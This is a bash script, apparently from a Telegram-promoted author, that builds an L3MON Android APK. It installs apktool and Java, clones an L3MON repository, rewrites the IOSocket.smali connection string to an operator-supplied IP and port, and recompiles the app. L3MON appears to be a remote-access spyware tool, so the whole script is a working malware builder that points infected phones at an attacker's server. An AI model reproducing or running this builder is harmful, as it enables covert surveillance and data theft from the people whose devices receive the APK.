#!/bin/bash
# Script by EFXTv t.me/efxtf
# It will build apk
# -----------------------------
# ENV DETECTION
# -----------------------------
if [ -d "$PREFIX" ] && command -v termux-info >/dev/null 2>&1; then
    ENV="TERMUX"
    BIN_DIR="$PREFIX/bin"
    PKG_INSTALL="pkg install -y"
else
    ENV="UBUNTU"
    BIN_DIR="/usr/local/bin"
    PKG_INSTALL="sudo apt install -y"
fi

# -----------------------------
# GLOBAL VARIABLES
# -----------------------------
BASE_DIR="$HOME/L3MON"
SMALI_FILE="$BASE_DIR/app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali"

# -----------------------------
# HELP MENU
# -----------------------------
show_help() {
    echo
    echo "[+] CORRECT [OPTION]"
    echo "[+] -check    Check and install dependencies"
    echo "[+] -start    Build APK with custom IP:PORT"
    echo
    exit 0
}

# -----------------------------
# DEPENDENCY CHECK
# -----------------------------
check_dep() {
    echo "[+] Checking for dependencies ($ENV)"

    miss=0

    check() {
        if command -v "$1" >/dev/null 2>&1; then
            echo "[OK] $1"
        else
            echo "[ER] $1"
            miss=1
        fi
    }

    check apktool
    check aapt
    check aapt2

    if command -v java >/dev/null 2>&1; then
        echo "[OK] Java: $(java -version 2>&1 | head -n 1|awk '{print $3}')"
    else
        echo "[ER] Java"
        miss=1
    fi

    if [ "$miss" -eq 1 ]; then
        echo
        read -p "[ETR] Install missing dependencies? (Y/y): " yn
        if [[ "$yn" == "Y" || "$yn" == "y" ]]; then
            install_deps
        fi
    fi
}

# -----------------------------
# INSTALL DEPS
# -----------------------------
install_deps() {
    echo "[OK] Installing dependencies for $ENV"

    if [ "$ENV" = "TERMUX" ]; then
        pkg update
        pkg install -y openjdk-17 aapt aapt2 apktool
    else
        sudo apt update
        sudo apt install -y openjdk-8-jdk aapt aapt2
        sudo rm /usr/bin/apktool* 1>/dev/null
        sudo rm /usr/local/bin/apktool* 1>/dev/null
        sudo wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool -q --show-progress
        sudo wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O /usr/local/bin/apktool.jar -q --show-progress
        sudo chmod +x /usr/local/bin/apktool*
    fi
}

# -----------------------------
# CLONE REPO
# -----------------------------
gitcs() {
    REPO="https://github.com/efxtv/L3MON.git"
    echo "[CLO] Cloning repository"
    git clone "$REPO" >/dev/null 2>&1 &
    pid=$!

    i=0
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) % 50 ))
        printf "\r[OKK] [%-50s]" "$(printf '#%.0s' $(seq 1 $i))"
        sleep 0.1
    done
    printf "\r[OKK] [%-50s] DONE\n" "##################################################"
}

# -----------------------------
# BUILD APK
# -----------------------------
complll() {
    apktool b "$BASE_DIR/app/factory/decompiled" -o out.apk >/dev/null 2>&1 &
    pid=$!

    bar_width=40
    progress=0

    while kill -0 $pid 2>/dev/null; do
        progress=$(( (progress + 1) % (bar_width + 1) ))
        printf "\rBuilding APK [%-*s]" "$bar_width" "$(printf '#%.0s' $(seq 1 $progress))"
        sleep 0.15
    done

    wait $pid
    printf "\r[APK] [%-*s] DONE\n" "$bar_width" "########################################"
    echo "[OKK] APK build saved -- out.apk"
}

# -----------------------------
# START MAIN SCRIPT
# -----------------------------
start_build() {

    if [ ! -d "$BASE_DIR" ]; then
        echo "[ERR] ~/L3MON not found"
        gitcs
    fi

    if [ ! -f "$SMALI_FILE" ]; then
        echo "[ERR] IOSocket.smali not found"
        exit 1
    fi

    read -p "[ETR] Enter IP: " ips
    read -p "[ETR] Enter Port: " ports

    if [ -z "$ips" ] || [ -z "$ports" ]; then
        echo "[ERR] IP or Port cannot be empty"
        exit 1
    fi

    echo "[OKK] Modifying IOSocket.smali..."
    sed -i "77c const-string v3, \"http://$ips:$ports?model=\"" "$SMALI_FILE"

    echo "[OKK] Smali Modification completed"
    complll
}

# -----------------------------
# ARGUMENT HANDLING
# -----------------------------
case "$1" in
    -check) check_dep ;;
    -start) start_build ;;
    *) show_help ;;
esac
